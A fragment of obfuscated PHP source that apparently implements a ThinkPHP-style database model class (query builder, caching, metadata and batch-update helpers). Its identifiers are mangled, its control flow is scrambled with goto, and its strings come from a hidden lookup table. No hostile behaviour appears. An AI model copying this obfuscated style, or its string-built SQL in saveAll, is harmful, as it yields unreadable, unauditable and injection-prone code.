strtolower($b´“≠ƒ´ËÉ); } return (!empty($this->dbName) ? $this->dbName . $fπ†≠ñó∏ò[103] : $fπ†≠ñó∏ò[33]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $d•ÈÎãâ–™ =& $_SERVER[Æ¡î¢≠¯™]; return isset($this->fields[$d•ÈÎãâ–™[245]]) ? $this->fields[$d•ÈÎãâ–™[245]] : $this->pk; } public function getDbFields() { $E”•úéÆÚÒ =& $_SERVER[Æ¡î¢≠¯™]; if (isset($this->options[$E”•úéÆÚÒ[273]])) { $c≥†’¬πô• = $this->db->getFields($this->options[$E”•úéÆÚÒ[273]]); return $c≥†’¬πô• ? array_keys($c≥†’¬πô•) : !1; } if ($this->fields) { $c≥†’¬πô• = $this->fields; unset($c≥†’¬πô•[$E”•úéÆÚÒ[244]], $c≥†’¬πô•[$E”•úéÆÚÒ[245]], $c≥†’¬πô•[$E”•úéÆÚÒ[246]], $c≥†’¬πô•[$E”•úéÆÚÒ[243]]); return $c≥†’¬πô•; } return !1; } public function data($aﬂñºèÑ…Ë = '') { $d§ è÷íÇÊ =& $_SERVER[Æ¡î¢≠¯™]; if ($d§ è÷íÇÊ[33] === $aﬂñºèÑ…Ë && !empty($this->data)) { return $this->data; } if (is_object($aﬂñºèÑ…Ë)) { $aﬂñºèÑ…Ë = get_object_vars($aﬂñºèÑ…Ë); } elseif (is_string($aﬂñºèÑ…Ë)) { parse_str($aﬂñºèÑ…Ë, $aﬂñºèÑ…Ë); } elseif (!is_array($aﬂñºèÑ…Ë)) { think_exception(think_lang($d§ è÷íÇÊ[265])); } $this->data = $aﬂñºèÑ…Ë; return $this; } public function join($aœÃ∏Ñ«†é) { $D“ŒÎı‡π‰ =& $_SERVER[Æ¡î¢≠¯™]; if (is_array($aœÃ∏Ñ«†é)) { $this->options[$D“ŒÎı‡π‰[276]] = $aœÃ∏Ñ«†é; } elseif (!empty($aœÃ∏Ñ«†é)) { $this->options[$D“ŒÎı‡π‰[276]][] = $aœÃ∏Ñ«†é; } return $this; } public function union($Cß´Ï©Ôµ‡, $AŒƒ¶Ò©õà = false) { goto dÍ˜÷»Áûø; bË¢ä™◊÷ñ: return $this; goto eÔ™ÕÇ‹´À; dÍ˜÷»Áûø: $B∂Æ¶õ—éß =& $_SERVER[Æ¡î¢≠¯™]; if (empty($Cß´Ï©Ôµ‡)) { return $this; } if ($AŒƒ¶Ò©õà) { $this->options[$B∂Æ¶õ—éß[341]][$B∂Æ¶õ—éß[342]] = !0; } goto FıÆôØÇÁÎ; FıÆôØÇÁÎ: if (is_object($Cß´Ï©Ôµ‡)) { $Cß´Ï©Ôµ‡ = get_object_vars($Cß´Ï©Ôµ‡); } if (is_string($Cß´Ï©Ôµ‡)) { $BÎÛôœΩÑ£ = $Cß´Ï©Ôµ‡; } elseif (is_array($Cß´Ï©Ôµ‡)) { if (isset($Cß´Ï©Ôµ‡[0])) { $this->options[$B∂Æ¶õ—éß[341]] = array_merge($this->options[$B∂Æ¶õ—éß[341]], $Cß´Ï©Ôµ‡); return $this; } else { $BÎÛôœΩÑ£ = $Cß´Ï©Ôµ‡; } } else { think_exception(think_lang($B∂Æ¶õ—éß[265])); } $this->options[$B∂Æ¶õ—éß[341]][] = $BÎÛôœΩÑ£; goto bË¢ä™◊÷ñ; eÔ™ÕÇ‹´À: } public function cache($BÉΩ ï¡Î« = true, $B·™ıèÆﬁ¯ = null, $e“È≈ä≤è¢ = '') { $e≥Ÿ—‰´ÒÁ =& $_SERVER[Æ¡î¢≠¯™]; if (!1 !== $BÉΩ ï¡Î«) { $this->options[$e≥Ÿ—‰´ÒÁ[343]] = array($e≥Ÿ—‰´ÒÁ[99] => $BÉΩ ï¡Î«, $e≥Ÿ—‰´ÒÁ[333] => $B·™ıèÆﬁ¯, $e≥Ÿ—‰´ÒÁ[29] => $e“È≈ä≤è¢); } return $this; } public function field($E€ı ß≠™Ç, $A∞‡Çœã‚î = false) { $b”≠∆Úß¨ﬂ =& $_SERVER[Æ¡î¢≠¯™]; if (!0 === $E€ı ß≠™Ç) { $D¡Â°⁄éó¿ = $this->getDbFields(); $E€ı ß≠™Ç = $D¡Â°⁄éó¿ ? $D¡Â°⁄éó¿ : $b”≠∆Úß¨ﬂ[183]; } elseif ($A∞‡Çœã‚î) { if (is_string($E€ı ß≠™Ç)) { $E€ı ß≠™Ç = explode($b”≠∆Úß¨ﬂ[47], $E€ı ß≠™Ç); } $D¡Â°⁄éó¿ = $this->getDbFields(); $E€ı ß≠™Ç = $D¡Â°⁄éó¿ ? array_diff($D¡Â°⁄éó¿, $E€ı ß≠™Ç) : $E€ı ß≠™Ç; } $this->options[$b”≠∆Úß¨ﬂ[267]] = $E€ı ß≠™Ç; return $this; } public function scope($e‰„¨Ñ⁄àÑ = '', $c≥∞™ëêÎã = NULL) { $f§ÂÃÉå« =& $_SERVER[Æ¡î¢≠¯™]; if ($f§ÂÃÉå«[33] === $e‰„¨Ñ⁄àÑ) { if (isset($this->_scope[$f§ÂÃÉå«[34]])) { $c›ÀãÍ∑‰â = $this->_scope[$f§ÂÃÉå«[34]]; } else { return $this; } } elseif (is_string($e‰„¨Ñ⁄àÑ)) { $C¬¡∂ÓÚΩ© = explode($f§ÂÃÉå«[47], $e‰„¨Ñ⁄àÑ); $c›ÀãÍ∑‰â = array(); foreach ($C¬¡∂ÓÚΩ© as $b‡¯‡°ÛﬁÓ) { if (!isset($this->_scope[$b‡¯‡°ÛﬁÓ])) { continue; } $c›ÀãÍ∑‰â = array_merge($c›ÀãÍ∑‰â, $this->_scope[$b‡¯‡°ÛﬁÓ]); } if (!empty($c≥∞™ëêÎã) && is_array($c≥∞™ëêÎã)) { $c›ÀãÍ∑‰â = array_merge($c›ÀãÍ∑‰â, $c≥∞™ëêÎã); } } elseif (is_array($e‰„¨Ñ⁄àÑ)) { $c›ÀãÍ∑‰â = $e‰„¨Ñ⁄àÑ; } if (is_array($c›ÀãÍ∑‰â) && !empty($c›ÀãÍ∑‰â)) { $this->options = array_merge($this->options, array_change_key_case($c›ÀãÍ∑‰â)); } return $this; } public function where($aáèÔ•—÷ú, $DÆ∏Ñê‘°‘ = null) { $e–⁄…Ö“±÷ =& $_SERVER[Æ¡î¢≠¯™]; if (!is_null($DÆ∏Ñê‘°‘) && is_string($aáèÔ•—÷ú)) { if (!is_array($DÆ∏Ñê‘°‘)) { $DÆ∏Ñê‘°‘ = func_get_args(); array_shift($DÆ∏Ñê‘°‘); } $DÆ∏Ñê‘°‘ = array_map(array($this->db, $e–⁄…Ö“±÷[337]), $DÆ∏Ñê‘°‘); $aáèÔ•—÷ú = vsprintf($aáèÔ•—÷ú, $DÆ∏Ñê‘°‘); } elseif (is_object($aáèÔ•—÷ú)) { $aáèÔ•—÷ú = get_object_vars($aáèÔ•—÷ú); } elseif (is_array($aáèÔ•—÷ú)) { foreach ($aáèÔ•—÷ú as $a∞‘ Ñ˜ÁÌ => $AØòûÃ‘ÊÃ) { if ((is_numeric($a∞‘ Ñ˜ÁÌ) || !$a∞‘ Ñ˜ÁÌ) && is_string($AØòûÃ‘ÊÃ)) { think_trace($e–⁄…Ö“±÷[344], $e–⁄…Ö“±÷[33], $e–⁄…Ö“±÷[46]); die; } } } if (is_string($aáèÔ•—÷ú) && $e–⁄…Ö“±÷[33] != $aáèÔ•—÷ú) { $DÑΩ¢‹ê”π = array(); $DÑΩ¢‹ê”π[$e–⁄…Ö“±÷[345]] = $aáèÔ•—÷ú; $aáèÔ•—÷ú = $DÑΩ¢‹ê”π; } if (isset($this->options[$e–⁄…Ö“±÷[269]])) { $this->options[$e–⁄…Ö“±÷[269]] = array_merge($this->options[$e–⁄…Ö“±÷[269]], $aáèÔ•—÷ú); } else { $this->options[$e–⁄…Ö“±÷[269]] = $aáèÔ•—÷ú; } return $this; } public function limit($C” †ÚòÏ∂, $C⁄Ñ◊¥•¥à = null) { $Dú´Ô£€ãˆ =& $_SERVER[Æ¡î¢≠¯™]; $this->options[$Dú´Ô£€ãˆ[286]] = is_null($C⁄Ñ◊¥•¥à) ? $C” †ÚòÏ∂ : $C” †ÚòÏ∂ . $Dú´Ô£€ãˆ[47] . $C⁄Ñ◊¥•¥à; return $this; } public function page($DÍèÈÎòŸù, $F∑∂âÔ©ÁÆ = null) { $eÙ˘ËÉñãò =& $_SERVER[Æ¡î¢≠¯™]; $this->options[$eÙ˘ËÉñãò[346]] = is_null($F∑∂âÔ©ÁÆ) ? $DÍèÈÎòŸù : $DÍèÈÎòŸù . $eÙ˘ËÉñãò[47] . $F∑∂âÔ©ÁÆ; return $this; } public function comment($eÒÖùËë û) { $this->options[$_SERVER[Æ¡î¢≠¯™][347]] = $eÒÖùËë û; return $this; } public function setProperty($eì—°•∆ÔÉ, $eµÁç’§Ùﬂ) { if (property_exists($this, $eì—°•∆ÔÉ)) { $this->{$eì—°•∆ÔÉ} = $eµÁç’§Ùﬂ; } return $this; } } class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\x6d\x6f\x64\151\x66\171\124\151\155\145", "\x74\x69\155\145", "\x69\156\163\145\x72\164\54\x75\x70\144\x61\x74\x65", "\x66\x75\x6e\x63\x74\151\x6f\156"), array("\143\162\x65\x61\164\145\x54\151\x6d\x65", "\x74\x69\x6d\x65", "\151\x6e\163\145\162\164", "\146\x75\156\x63\164\x69\157\x6e")); public function setDataAuto($eŒ≠¢ãê–º) { $this->dataAuto = $eŒ≠¢ãê–º; } public function __construct($BàΩëô≥¡∂ = '', $câçÌÖ™ıÙ = '', $A—§ë„í∞ƒ = '') { parent::__construct($BàΩëô≥¡∂, $câçÌÖ™ıÙ, $A—§ë„í∞ƒ); } public static function textEncode($E§å‰àè«Ë) { if (!$E§å‰àè«Ë) { return $E§å‰àè«Ë; } $fî≤ÆıÈµ± = json_encode($E§å‰àè«Ë); $fî≤ÆıÈµ± = preg_replace_callback($_SERVER[Æ¡î¢≠¯™][348], function ($CÌá¶Û”ÆÃ) { return addslashes($CÌá¶Û”ÆÃ[0]); }, $fî≤ÆıÈµ±); return json_decode($fî≤ÆıÈµ±); } public static function textDecode($BŸ›¡§±ç˜) { $DÃÇﬂ€∑€Ö =& $_SERVER[Æ¡î¢≠¯™]; $e•Œ”ºÉ˘π = json_encode($BŸ›¡§±ç˜); $e•Œ”ºÉ˘π = preg_replace_callback($DÃÇﬂ€∑€Ö[349], function ($cöÁ£»Óû˘) { return $_SERVER[Æ¡î¢≠¯™][105]; }, $e•Œ”ºÉ˘π); return json_decode($e•Œ”ºÉ˘π); } protected $tableMeta = array(); protected function _beforeInsert(&$f≥áŒÑÌ”«, $C√æ‰í–Ü∂) { $b«§âïçà‹ =& $_SERVER[Æ¡î¢≠¯™]; if (!$this->checkDataAutoHas($b«§âïçà‹[350])) { return; } $this->dataBeforeFilter($f≥áŒÑÌ”«, $b«§âïçà‹[350]); } protected function _beforeUpdate(&$EËÙÃÚÜÂ©, $d∆Ùúà≤ìÌ) { $d©ê‰åÂÌÚ =& $_SERVER[Æ¡î¢≠¯™]; if (!$this->checkDataAutoHas($d©ê‰åÂÌÚ[351])) { return; } $this->dataBeforeFilter($EËÙÃÚÜÂ©, $d©ê‰åÂÌÚ[351]); } protected function _afterSelect(&$D¶Íèä´è∞, $dìﬂÏıî®Õ) { if (!is_array($D¶Íèä´è∞)) { return; } if (!$this->checkDataAutoHas($_SERVER[Æ¡î¢≠¯™][352])) { return; } foreach ($D¶Íèä´è∞ as &$EŒºòπâÃ´) { $this->dataAfterFilter($EŒºòπâÃ´); } } protected function _afterFind(&$d±Ã√ç§≥ë, $c ê∞√§Áñ) { if (!is_array($d±Ã√ç§≥ë)) { return; } if (!$this->checkDataAutoHas($_SERVER[Æ¡î¢≠¯™][352])) { return; } $this->dataAfterFilter($d±Ã√ç§≥ë); } public function setAutoIncrement($EâÑ—ØˆÎ) { $eËçíÚ–‹Ü = array($this->getPk() => $EâÑ—ØˆÎ); $BÕÕ€Òµ∆± = $this->data($eËçíÚ–‹Ü)->add(); if ($BÕÕ€Òµ∆±) { $this->delete($BÕÕ€Òµ∆±); } } public function getAutoIncrement() { $Dé™ìñÍèÛ = $this->getTableName(); $Dé≈ÀîêﬁÙ = $this->max($this->getPk()); $Fπ§›¢ØΩü = $this->query("\x73\150\x6f\167\x20\x74\141\x62\154\x65\x20\x73\164\141\164\x75\x73\40\x77\150\x65\162\145\x20\116\141\x6d\145\x3d\47{$Dé™ìñÍèÛ}\47"); $F≥‘âº·ïµ = $Fπ§›¢ØΩü[0][$_SERVER[Æ¡î¢≠¯™][353]]; $EµœÕ∆ç–¶ = max($Dé≈ÀîêﬁÙ, $F≥‘âº·ïµ); return $EµœÕ∆ç–¶; } protected function _callBefore($Cùâ´óÌÂä, $E≈äã◊…®â) { return $this->cacheCallCheck($Cùâ´óÌÂä, $E≈äã◊…®â, !1); } protected function _callAfter($b‰◊√≤õâÃ, $D∑û§´±≥·) { return $this->cacheCallCheck($b‰◊√≤õâÃ, $D∑û§´±≥·, !0); } protected function cacheFunctionAlias($Bì¬ÙÙ€Ê†) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($D é†◊ﬂÉˆ, $Eâ¯µ°«Í⁄, $BÛÛÊä”áã = false) { $fº≈óù¯ª˘ = $this->cacheFunctionAlias($Eâ¯µ°«Í⁄); if (!$fº≈óù¯ª˘) { return; } foreach ($fº≈óù¯ª˘ as $cºú¯ö±à‡ => $E“∂äÕ–¯) { $b“ñ∏µ¢Ù‚ = $E“∂äÕ–¯[0]; $fó ∫·Ï≠È = explode($_SERVER[Æ¡î¢≠¯™][47], $E“∂äÕ–¯[1]); if ($D é†◊ﬂÉˆ == $cºú¯ö±à‡) { return $this->cacheFunctionGet($cºú¯ö±à‡, $b“ñ∏µ¢Ù‚); } if ($BÛÛÊä”áã && in_array($D é†◊ﬂÉˆ, $fó ∫·Ï≠È)) { $this->cacheFunctionClear($cºú¯ö±à‡, $b“ñ∏µ¢Ù‚); } } } public function cacheFunctionGet($A◊ø§≥ìª‰, $D¢ﬂ÷á ÉÜ) { $f®ìÈ¡€∑‹ = $this->cacheKeyMake($A◊ø§≥ìª‰, $D¢ﬂ÷á ÉÜ); $cÛÖËçêøô = Cache::get($f®ìÈ¡€∑‹); if (!is_array($cÛÖËçêøô)) { $cÛÖËçêøô = call_user_func_array(array($this, $A◊ø§≥ìª‰), array($D¢ﬂ÷á ÉÜ, !0)); Cache::set($f®ìÈ¡€∑‹, $cÛÖËçêøô); } return $cÛÖËçêøô; } public function cacheFunctionClear($D“‚√ëÙ∆‚, $dêò≥º¿π“) { $CÛªóÉû‰Ù = $dêò≥º¿π“; if (!is_array($dêò≥º¿π“)) { $CÛªóÉû‰Ù = array($dêò≥º¿π“); } foreach ($CÛªóÉû‰Ù as $A„€π¬ÚÑ©) { $F’û©ªìê≤ = $this->cacheKeyMake($D“‚√ëÙ∆‚, $A„€π¬ÚÑ©); Cache::remove($F’û©ªìê≤); } } private function cacheKeyMake($f§Ëàöæü’, $d¡«òÀ√—Ñ) { $d•É≤ã“á” =& $_SERVER[Æ¡î¢≠¯™]; return get_class($this) . $d•É≤ã“á”[80] . $f§Ëàöæü’ . $d•É≤ã“á”[354] . $d¡«òÀ√—Ñ; } protected function selectPage($f∂Ïã˘≈◊µ = 200, $C ˜Â∏Ø“É = 1) { goto EÜ≠¨Ÿä“√; cí¬¥ë«öÿ: $aÜöé•Òºá = ceil($e¯àé‡†©∫ / $f∂Ïã˘≈◊µ); $C ˜Â∏Ø“É = intval(isset($in[$e¨èè·†ˆ[346]]) ? $in[$e¨èè·†ˆ[346]] : $C ˜Â∏Ø“É); $C ˜Â∏Ø“É = $C ˜Â∏Ø“É <= 1 ? 1 : ($C ˜Â∏Ø“É >= $aÜöé•Òºá ? $aÜöé•Òºá : $C ˜Â∏Ø“É); goto B¿Ω∑ É≈ø; EÜ≠¨Ÿä“√: $e¨èè·†ˆ =& $_SERVER[Æ¡î¢≠¯™]; global $in; $cá•¢ËÀÈ¢ = $this->optionsValue(); goto DıªâÖù’é; cò£ΩŸÇÆã: $f‚¡É£¶¨Ù = $cá•¢ËÀÈ¢; $f‚¡É£¶¨Ù[$e¨èè·†ˆ[356]] = array(); $this->optionsValue($f‚¡É£¶¨Ù); goto aÒÇ±èÑ™Ç; cÆ“‰∑û›ø: if ($aÜöé•Òºá == 1) { $e¯àé‡†©∫ = count($Aåàôƒä —); } $dËÖëªêêê = array($e¨èè·†ˆ[357] => array($e¨èè·†ˆ[358] => $e¯àé‡†©∫, $e¨èè·†ˆ[355] => $f∂Ïã˘≈◊µ, $e¨èè·†ˆ[346] => $C ˜Â∏Ø“É, $e¨èè·†ˆ[359] => $aÜöé•Òºá), $e¨èè·†ˆ[360] => $Aåàôƒä — ? $Aåàôƒä — : array()); return $dËÖëªêêê; goto F·ñÕﬁÁ◊›; DıªâÖù’é: $Dé™êú £† = 4000; $f∂Ïã˘≈◊µ = isset($in[$e¨èè·†ˆ[355]]) ? $in[$e¨èè·†ˆ[355]] : $f∂Ïã˘≈◊µ; if ($f∂Ïã˘≈◊µ === -1) { unset($in[$e¨èè·†ˆ[355]]); $Dé™êú £† = 100000000; $f∂Ïã˘≈◊µ = $Dé™êú £†; } goto cò£ΩŸÇÆã; aÒÇ±èÑ™Ç: $e¯àé‡†©∫ = intval($this->count()); $f∂Ïã˘≈◊µ = intval($f∂Ïã˘≈◊µ); $f∂Ïã˘≈◊µ = $f∂Ïã˘≈◊µ <= 5 ? 5 : ($f∂Ïã˘≈◊µ >= $Dé™êú £† ? $Dé™êú £† : $f∂Ïã˘≈◊µ); goto cí¬¥ë«öÿ; B¿Ω∑ É≈ø: $this->optionsValue($cá•¢ËÀÈ¢); $Aåàôƒä — = $this->page($C ˜Â∏Ø“É, $f∂Ïã˘≈◊µ)->select(); $Aåàôƒä — = is_array($Aåàôƒä —) ? $Aåàôƒä — : array(); goto cÆ“‰∑û›ø; F·ñÕﬁÁ◊›: } protected function checkLength($f´‡“îéà, $DÂ«˘∂‹é‰ = 0, $BÁóôﬂ–™á = '') { $B’‚‡«√æä =& $_SERVER[Æ¡î¢≠¯™]; $DÂ«˘∂‹é‰ = $DÂ«˘∂‹é‰ ? $DÂ«˘∂‹é‰ : 65536; if (!$f´‡“îéà || strlen($f´‡“îéà) < $DÂ«˘∂‹é‰) { return; } $BÁóôﬂ–™á = $BÁóôﬂ–™á ? $BÁóôﬂ–™á . $B’‚‡«√æä[77] : $B’‚‡«√æä[33]; show_json($BÁóôﬂ–™á . LNG($B’‚‡«√æä[361]) . "\50{$DÂ«˘∂‹é‰}\51", !1); } protected function metaSet($d¥Œˆ∑êÔ≈, $fª˘ë⁄∑¯· = null, $B«‘«ÿá‹∞ = null) { goto bÔÕõÀúÇ; BáúÁ∑ﬁö·: $CãÕÚ™‡õÙ = $this->tableMeta[$Bˆäòçÿ´•[363]]; $fΩÇáÕ€ç = Model($CãÕÚ™‡õÙ); $E‘ Ù∫ë‰Ú = array($Cã©¢íïÖ => $d¥Œˆ∑êÔ≈, $Bˆäòçÿ´•[364] => $fª˘ë⁄∑¯·); goto Bœ√¬àÔõè; F–¨Õì‡øà: $fΩÇáÕ€ç->where(array($Cã©¢íïÖ => $d¥Œˆ∑êÔ≈))->addAll($fòÍ™„ºΩÃ, array(), !0); return !0; goto dπ‰ºƒÎÔ≈; eπ∞¡ªÊÏ†: if (is_string($fª˘ë⁄∑¯·)) { $eπ“»àÔ—â[$fª˘ë⁄∑¯·] = $B«‘«ÿá‹∞; } $fòÍ™„ºΩÃ = array(); foreach ($eπ“»àÔ—â as $FÂªõ⁄˘Æõ => $då±”¡áÿ≤) { $this->checkLength($då±”¡áÿ≤, !1, $CãÕÚ™‡õÙ . $Bˆäòçÿ´•[4] . $FÂªõ⁄˘Æõ); $fòÍ™„ºΩÃ[] = array($Cã©¢íïÖ => $d¥Œˆ∑êÔ≈, $Bˆäòçÿ´•[99] => $FÂªõ⁄˘Æõ, $Bˆäòçÿ´•[365] => $då±”¡áÿ≤); } goto F–¨Õì‡øà; bÔÕõÀúÇ: $Bˆäòçÿ´• =& $_SERVER[Æ¡î¢≠¯™]; if (!$this->tableMeta) { return !1; } $Cã©¢íïÖ = $this->tableMeta[$Bˆäòçÿ´•[362]]; goto BáúÁ∑ﬁö·; Bœ√¬àÔõè: if (is_null($fª˘ë⁄∑¯·)) { return $fΩÇáÕ€ç->where(array($Cã©¢íïÖ => $d¥Œˆ∑êÔ≈))->delete(); } if (is_null($B«‘«ÿá‹∞)) { return $fΩÇáÕ€ç->where($E‘ Ù∫ë‰Ú)->delete(); } $eπ“»àÔ—â = is_array($fª˘ë⁄∑¯·) ? $fª˘ë⁄∑¯· : array(); goto eπ∞¡ªÊÏ†; dπ‰ºƒÎÔ≈: } public function metaGet($düééËÁœ∆) { goto aƒΩ≠Ù⁄öÌ; aƒΩ≠Ù⁄öÌ: $C∑ëœ‹Ï∑ =& $_SERVER[Æ¡î¢≠¯™]; if (!$this->tableMeta) { return array(); } $e¯≠åπ¡∞Ì = $this->tableMeta[$C∑ëœ‹Ï∑[362]]; goto d∆Îäà¯€‹; d∆Îäà¯€‹: $Aü¥ÊÛ¯áÑ = Model($this->tableMeta[$C∑ëœ‹Ï∑[363]]); $a–¿åÑç⁄œ = array($e¯≠åπ¡∞Ì => $düééËÁœ∆); $aêÆı…≤πΩ = $Aü¥ÊÛ¯áÑ->field($C∑ëœ‹Ï∑[366])->where($a–¿åÑç⁄œ)->select(); goto EÜ“ô™œÃ∏; EÜ“ô™œÃ∏: $aêÆı…≤πΩ = array_to_keyvalue($aêÆı…≤πΩ, $C∑ëœ‹Ï∑[99], $C∑ëœ‹Ï∑[365]); return $aêÆı…≤πΩ; goto C—≈∂ã©∞Ï; C—≈∂ã©∞Ï: } private function checkDataAutoHas($a¨ıâÕ∫ñ⁄) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $A¯Âœ∫◊é†) { if (in_array($a¨ıâÕ∫ñ⁄, explode($_SERVER[Æ¡î¢≠¯™][47], $A¯Âœ∫◊é†[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$DêÑå≠É‰æ, $fÇ‹´õ≥•∑) { $bÿ‡çÉÑ–ê =& $_SERVER[Æ¡î¢≠¯™]; foreach ($this->dataAuto as $FåöÏ¡›∫ ) { $F∏âŒıÒÔú = $FåöÏ¡›∫ [0]; if (!in_array($fÇ‹´õ≥•∑, explode($bÿ‡çÉÑ–ê[47], $FåöÏ¡›∫ [2]))) { continue; } switch (trim($FåöÏ¡›∫ [3])) { case $bÿ‡çÉÑ–ê[315]: case $bÿ‡çÉÑ–ê[316]: $A€ÒÑÂÜıø = $FåöÏ¡›∫ [1]; $bóõÊÃ◊ÒÌ = isset($FåöÏ¡›∫ [4]) ? (array) $FåöÏ¡›∫ [4] : array(); if ($A€ÒÑÂÜıø == $bÿ‡çÉÑ–ê[197] && array_key_exists($F∏âŒıÒÔú, $DêÑå≠É‰æ)) { if (!$DêÑå≠É‰æ[$F∏âŒıÒÔú]) { unset($DêÑå≠É‰æ[$F∏âŒıÒÔú]); } break; } if (isset($DêÑå≠É‰æ[$F∏âŒıÒÔú])) { array_unshift($bóõÊÃ◊ÒÌ, $DêÑå≠É‰æ[$F∏âŒıÒÔú]); } if ($bÿ‡çÉÑ–ê[315] == $FåöÏ¡›∫ [3]) { $DêÑå≠É‰æ[$F∏âŒıÒÔú] = call_user_func_array($A€ÒÑÂÜıø, $bóõÊÃ◊ÒÌ); } else { $DêÑå≠É‰æ[$F∏âŒıÒÔú] = call_user_func_array(array(&$this, $A€ÒÑÂÜıø), $bóõÊÃ◊ÒÌ); } break; case $bÿ‡çÉÑ–ê[267]: $DêÑå≠É‰æ[$F∏âŒıÒÔú] = $DêÑå≠É‰æ[$FåöÏ¡›∫ [1]]; break; case $bÿ‡çÉÑ–ê[288]: if (isset($DêÑå≠É‰æ[$F∏âŒıÒÔú]) && !is_string($DêÑå≠É‰æ[$F∏âŒıÒÔú])) { $DêÑå≠É‰æ[$F∏âŒıÒÔú] = json_encode_force($DêÑå≠É‰æ[$F∏âŒıÒÔú]); } break; case $bÿ‡çÉÑ–ê[317]: if ($DêÑå≠É‰æ[$F∏âŒıÒÔú] === $bÿ‡çÉÑ–ê[33]) { unset($DêÑå≠É‰æ[$F∏âŒıÒÔú]); } break; case $bÿ‡çÉÑ–ê[318]: $DêÑå≠É‰æ[$F∏âŒıÒÔú] = $FåöÏ¡›∫ [1]; default: break; } } if ($fÇ‹´õ≥•∑ == $bÿ‡çÉÑ–ê[350]) { $EÌÈÜ‡ﬂ›’ = strtolower($this->db->getDbType()); if (strpos($EÌÈÜ‡ﬂ›’, $bÿ‡çÉÑ–ê[9]) !== 0) { return; } $Aì–àÒ™∂ä = $this->field(!0)->fields; $f¯≠®ÖëÚñ = $Aì–àÒ™∂ä[$bÿ‡çÉÑ–ê[246]]; if (isset($Aì–àÒ™∂ä[$bÿ‡çÉÑ–ê[245]])) { unset($f¯≠®ÖëÚñ[$Aì–àÒ™∂ä[$bÿ‡çÉÑ–ê[245]]]); } foreach ($f¯≠®ÖëÚñ as $F´ÓÈ€ˆƒé => $fÇ‹´õ≥•∑) { if (!isset($DêÑå≠É‰æ[$F´ÓÈ€ˆƒé])) { $DêÑå≠É‰æ[$F´ÓÈ€ˆƒé] = $bÿ‡çÉÑ–ê[33]; } } } } private function dataAfterFilter(&$Fìê ïå¶π) { $A◊ô≠¬à—¿ =& $_SERVER[Æ¡î¢≠¯™]; foreach ($this->dataAuto as $EÁë®ï∏Îø) { $E∞ˆÈ∑œõÒ = $EÁë®ï∏Îø[0]; if (!in_array($A◊ô≠¬à—¿[352], explode($A◊ô≠¬à—¿[47], $EÁë®ï∏Îø[2]))) { continue; } if (!isset($Fìê ïå¶π[$E∞ˆÈ∑œõÒ])) { continue; } switch (trim($EÁë®ï∏Îø[3])) { case $A◊ô≠¬à—¿[315]: case $A◊ô≠¬à—¿[316]: $c›Ò˘Òã° = isset($EÁë®ï∏Îø[4]) ? (array) $EÁë®ï∏Îø[4] : array(); array_unshift($c›Ò˘Òã°, $Fìê ïå¶π[$E∞ˆÈ∑œõÒ]); if ($A◊ô≠¬à—¿[315] == $EÁë®ï∏Îø[3]) { $Fìê ïå¶π[$E∞ˆÈ∑œõÒ] = call_user_func_array($EÁë®ï∏Îø[1], $c›Ò˘Òã°); } else { $Fìê ïå¶π[$E∞ˆÈ∑œõÒ] = call_user_func_array(array(&$this, $EÁë®ï∏Îø[1]), $c›Ò˘Òã°); } break; case $A◊ô≠¬à—¿[267]: $Fìê ïå¶π[$E∞ˆÈ∑œõÒ] = $Fìê ïå¶π[$EÁë®ï∏Îø[1]]; break; case $A◊ô≠¬à—¿[288]: $D‡≠ËÖ≥Œú = $Fìê ïå¶π[$E∞ˆÈ∑œõÒ]; $Fìê ïå¶π[$E∞ˆÈ∑œõÒ] = json_decode($D‡≠ËÖ≥Œú, !0); if (is_null($Fìê ïå¶π[$E∞ˆÈ∑œõÒ])) { $Fìê ïå¶π[$E∞ˆÈ∑œõÒ] = $D‡≠ËÖ≥Œú; } break; case $A◊ô≠¬à—¿[317]: if ($Fìê ïå¶π[$E∞ˆÈ∑œõÒ] === $A◊ô≠¬à—¿[33]) { unset($Fìê ïå¶π[$E∞ˆÈ∑œõÒ]); } break; case $A◊ô≠¬à—¿[318]: $Fìê ïå¶π[$E∞ˆÈ∑œõÒ] = $EÁë®ï∏Îø[1]; default: break; } } } public function saveAll($d‹π°‰»©√) { goto fà√ﬂÊä€¶; CÖ‰ΩªﬁŒ–: $this->chunkEventSet(); goto A«ﬁØÿ«˘¯; E–çåÆ«‹æ: $f≥™ü™à¨Ì = array(); $f»÷°‚ãÓ£ = count($d‹π°‰»©√); for ($Báœ£ Æ´· = 0; $Báœ£ Æ´· < $f»÷°‚ãÓ£; $Báœ£ Æ´·++) { $e≥èÑ„ñ‚† = $d‹π°‰»©√[$Báœ£ Æ´·]; if (!is_array($e≥èÑ„ñ‚†) || count($e≥èÑ„ñ‚†) != 4) { continue; } $c§“Áà‘Ø√ = "\125\120\104\101\x54\x45\40{$Bﬂ∑«çﬁ•Ω}\40\x53\105\124\x20{$e≥èÑ„ñ‚†[2]}\40\x3d\40\x43\101\x53\105\x20{$e≥èÑ„ñ‚†[0]}\x20\12"; if ($f–≤“€úÍ∞ == 0) { $c°ÊπîÈÂ∂ = $c§“Áà‘Ø√; } $f≥™ü™à¨Ì[] = $D˘Ï«üèùË[123] . $e≥èÑ„ñ‚†[1] . $D˘Ï«üèùË[123]; $f–≤“€úÍ∞++; $c°ÊπîÈÂ∂ .= "\40\x57\110\105\x4e\40\x27{$e≥èÑ„ñ‚†[1]}\x27\40\x54\110\105\116\x20\x27{$e≥èÑ„ñ‚†[3]}\x27\x20\xa"; if ($f–≤“€úÍ∞ == $C«˘›í∑ƒ— || $Báœ£ Æ´· == $f»÷°‚ãÓ£ - 1) { goto fªÌª‡Œ´â; fªÌª‡Œ´â: $eÈâ÷›ïîã = implode($D˘Ï«üèùË[47], $f≥™ü™à¨Ì); $c°ÊπîÈÂ∂ .= "\40\x45\116\104\40\x20\127\x48\105\122\105\40{$e≥èÑ„ñ‚†[0]}\x20\111\116\x20\50{$eÈâ÷›ïîã}\x29\40"; 